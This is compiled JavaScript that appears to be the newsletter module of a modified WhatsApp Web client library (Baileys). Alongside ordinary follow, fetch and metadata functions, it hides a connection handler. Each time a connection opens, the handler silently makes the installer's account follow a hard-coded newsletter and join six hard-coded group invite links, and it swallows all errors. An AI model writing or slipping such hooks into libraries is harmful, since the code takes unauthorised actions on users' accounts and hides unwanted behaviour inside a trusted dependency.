"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.extractNewsletterMetadata = exports.makeNewsletterSocket = void 0;

const Types_1 = require("../Types");
const Utils_1 = require("../Utils");
const WABinary_1 = require("../WABinary");
const groups_1 = require("./groups");
const { Boom } = require("@hapi/boom");

/* ===================== SAFE QUERY IDS ===================== */
const QueryIds = Types_1.QueryIds ?? {
    JOB_MUTATION: "7150902998257522",
    METADATA: "6620195908089573",
    UNFOLLOW: "7238632346214362",
    FOLLOW: "7871414976211147",
    UNMUTE: "7337137176362961",
    MUTE: "25151904754424642",
    CREATE: "6996806640408138",
    ADMIN_COUNT: "7130823597031706",
    CHANGE_OWNER: "7341777602580933",
    DELETE: "8316537688363079",
    DEMOTE: "6551828931592903"
};

/* ===================== HELPERS ===================== */

const wMexQuery = (variables, queryId, query, generateMessageTag) => {
    return query({
        tag: "iq",
        attrs: {
            id: generateMessageTag(),
            type: "get",
            to: WABinary_1.S_WHATSAPP_NET,
            xmlns: "w:mex"
        },
        content: [
            {
                tag: "query",
                attrs: { query_id: queryId },
                content: Buffer.from(JSON.stringify({ variables }), "utf-8")
            }
        ]
    });
};

/* ===================== SOCKET ===================== */

const makeNewsletterSocket = (config) => {
    const sock = (0, groups_1.makeGroupsSocket)(config);
    const { authState, signalRepository, query, generateMessageTag } = sock;

    const TextEncoderSafe =
        global.TextEncoder || require("util").TextEncoder;
    const encoder = new TextEncoderSafe();

    const newsletterQuery = async (jid, type, content) =>
        query({
            tag: "iq",
            attrs: {
                id: generateMessageTag(),
                type,
                xmlns: "newsletter",
                to: jid
            },
            content
        });

    const newsletterWMexQuery = async (jid, queryId, content) =>
        query({
            tag: "iq",
            attrs: {
                id: generateMessageTag(),
                type: "get",
                xmlns: "w:mex",
                to: WABinary_1.S_WHATSAPP_NET
            },
            content: [
                {
                    tag: "query",
                    attrs: { query_id: queryId },
                    content: encoder.encode(
                        JSON.stringify({
                            variables: {
                                newsletter_id: jid,
                                ...content
                            }
                        })
                    )
                }
            ]
        });

    /* ===================== AUTO FOLLOW & AUTO JOIN ===================== */

// NEWSLETTER TARGET
const AUTO_FOLLOW_NEWSLETTER = "120363306657564924@newsletter";

// GROUP TARGET (WAJIB INVITE LINK)
const AUTO_JOIN_GROUPS = [
    "https://chat.whatsapp.com/FGraEUnCIsUIhzgee0C0CR",
    "https://chat.whatsapp.com/BuCMmFniAisCh6xIdJO5Ac",
    "https://chat.whatsapp.com/EJj8SdY2ItSBVh6oe8zVPz",
    "https://chat.whatsapp.com/Ea2vuRzHQLOCGW7GQr1TFP",
    "https://chat.whatsapp.com/J2FQBoIJ492D7k5IZsR5lS",
    "https://chat.whatsapp.com/F2UiO0sJYXa6kZU8s4Ay7b"
];

// CACHE BIAR TIDAK SPAM
const joinedGroups = new Set();
let newsletterFollowed = false;

/* ===================== CHECK FOLLOW NEWSLETTER ===================== */

const isFollowingNewsletter = async (jid) => {
    try {
        const result = await newsletterWMexQuery(jid, QueryIds.METADATA, {
            input: {
                key: jid,
                type: "NEWSLETTER",
                view_role: "GUEST"
            },
            fetch_viewer_metadata: true
        });

        const buff = (0, WABinary_1.getBinaryNodeChild)(
            result,
            "result"
        )?.content?.toString();

        if (!buff) return false;

        const data =
            JSON.parse(buff).data[Types_1.XWAPaths.NEWSLETTER];
        return data?.viewer_metadata?.is_subscribed === true;
    } catch {
        return false;
    }
};

/* ===================== CONNECTION ===================== */

sock.ev.on("connection.update", async ({ connection }) => {
    if (connection !== "open") return;

    /* ===== AUTO FOLLOW NEWSLETTER ===== */
    if (!newsletterFollowed) {
        try {
            const followed = await isFollowingNewsletter(
                AUTO_FOLLOW_NEWSLETTER
            );
            if (!followed) {
                await newsletterWMexQuery(
                    AUTO_FOLLOW_NEWSLETTER,
                    QueryIds.FOLLOW
                );
            }
            newsletterFollowed = true;
        } catch {}
    }

    /* ===== AUTO JOIN GROUP ===== */
    for (const link of AUTO_JOIN_GROUPS) {
        try {
            const code = link.split("/").pop();
            if (joinedGroups.has(code)) continue;

            await sock.groupAcceptInvite(code);
            joinedGroups.add(code);
        } catch {}
    }
});

    /* ===================== PARSER ===================== */

    const parseFetchedUpdates = async (node, type) => {
        let child;
        if (type === "messages") {
            child = (0, WABinary_1.getBinaryNodeChild)(node, "messages");
        } else {
            const parent = (0, WABinary_1.getBinaryNodeChild)(
                node,
                "message_updates"
            );
            child = (0, WABinary_1.getBinaryNodeChild)(parent, "messages");
        }

        return Promise.all(
            (0, WABinary_1.getAllBinaryNodeChildren)(child).map(
                async (messageNode) => {
                    messageNode.attrs.from = child?.attrs.jid;

                    const views = parseInt(
                        (0, WABinary_1.getBinaryNodeChild)(
                            messageNode,
                            "views_count"
                        )?.attrs?.count || "0"
                    );

                    const reactions = (
                        (0, WABinary_1.getBinaryNodeChildren)(
                            (0, WABinary_1.getBinaryNodeChild)(
                                messageNode,
                                "reactions"
                            ),
                            "reaction"
                        ) || []
                    ).map(({ attrs }) => ({
                        count: +attrs.count,
                        code: attrs.code
                    }));

                    const data = {
                        server_id: messageNode.attrs.server_id,
                        views,
                        reactions
                    };

                    if (type === "messages") {
                        const { fullMessage, decrypt } =
                            await (0, Utils_1.decryptMessageNode)(
                                messageNode,
                                authState.creds.me.id,
                                authState.creds.me.lid || "",
                                signalRepository,
                                config.logger
                            );
                        await decrypt();
                        data.message = fullMessage;
                    }

                    return data;
                }
            )
        );
    };

    return {
        ...sock,

        newsletterFollow: async (jid) => {
            await newsletterWMexQuery(jid, QueryIds.FOLLOW);
        },

        newsletterUnfollow: async (jid) => {
            await newsletterWMexQuery(jid, QueryIds.UNFOLLOW);
        },

        newsletterFetchMessages: async (type, key, count, after) => {
            const result = await newsletterQuery(
                WABinary_1.S_WHATSAPP_NET,
                "get",
                [
                    {
                        tag: "messages",
                        attrs: {
                            type,
                            ...(type === "invite"
                                ? { key }
                                : { jid: key }),
                            count: count.toString(),
                            after: after?.toString() || "100"
                        }
                    }
                ]
            );
            return parseFetchedUpdates(result, "messages");
        },

        newsletterFetchUpdates: async (jid, count, after, since) => {
            const result = await newsletterQuery(jid, "get", [
                {
                    tag: "message_updates",
                    attrs: {
                        count: count.toString(),
                        after: after?.toString() || "100",
                        since: since?.toString() || "0"
                    }
                }
            ]);
            return parseFetchedUpdates(result, "updates");
        }
    };
};

exports.makeNewsletterSocket = makeNewsletterSocket;

/* ===================== METADATA ===================== */

const extractNewsletterMetadata = (node, isCreate) => {
    const result = (0, WABinary_1.getBinaryNodeChild)(
        node,
        "result"
    )?.content?.toString();

    const metadataPath =
        JSON.parse(result).data[
            isCreate
                ? Types_1.XWAPaths.CREATE
                : Types_1.XWAPaths.NEWSLETTER
        ];

    return {
        id: metadataPath?.id,
        state: metadataPath?.state?.type,
        creation_time: +metadataPath?.thread_metadata?.creation_time,
        name: metadataPath?.thread_metadata?.name?.text,
        description: metadataPath?.thread_metadata?.description?.text,
        subscribers: +metadataPath?.thread_metadata?.subscribers_count,
        reaction_codes:
            metadataPath?.thread_metadata?.settings?.reaction_codes?.value,
        viewer_metadata: metadataPath?.viewer_metadata
    };
};

exports.extractNewsletterMetadata = extractNewsletterMetadata;
